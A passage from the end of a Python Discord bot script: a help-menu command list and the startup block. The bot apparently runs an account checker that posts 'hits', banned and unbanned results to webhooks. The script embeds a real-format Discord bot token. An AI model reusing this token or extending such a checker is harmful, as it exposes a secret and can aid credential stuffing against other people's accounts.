        ("$set_logs_hits #channel", "Set a dedicated channel for Hits.txt only."),
        ("$set_webhook <type> <url>", "Set webhook for `hits`, `banned`, or `unbanned`."),
        ("$second_webhook <url>", "Send all hit embeds to an additional webhook."),
        ("$disable_secondwebhook", "Stop sending to the secondary webhook."),
        ("$emojis", "(Owner) Upload custom emojis to this server."),
        ("$setup", "(Owner) Auto‑create #checker‑logs, #hits, #banned, #unbanned with webhooks."),
        ("$auth @user", "(Owner) Authorise a user to use `$check` and `$stop`."),
        ("$unauth @user", "(Owner) Remove authorisation."),
        ("$listauth", "(Owner) List all authorised users."),
        ("$help", "Show this modern command list."),
    ]

    for cmd, desc in commands_list:
        embed.add_field(name=f"🔹 `{cmd}`", value=desc, inline=False)

    await ctx.send(embed=embed)

# ==================================================================
# Run Bot
# ==================================================================
if __name__ == "__main__":
    if BOT_TOKEN == "MTUxNjQ0NTkyODM1NjE4ODMwMQ.GaphK2.AAqQeE3MiqYDYQpry2Wi-CacJiYdGJTci0Q6gY":
        print("❌ Please set your BOT_TOKEN environment variable or edit the script.")
        sys.exit(1)
    os.makedirs("results", exist_ok=True)
    print("Starting bot with modern UI, reliable checker, and file logging...")
    bot.run(BOT_TOKEN)
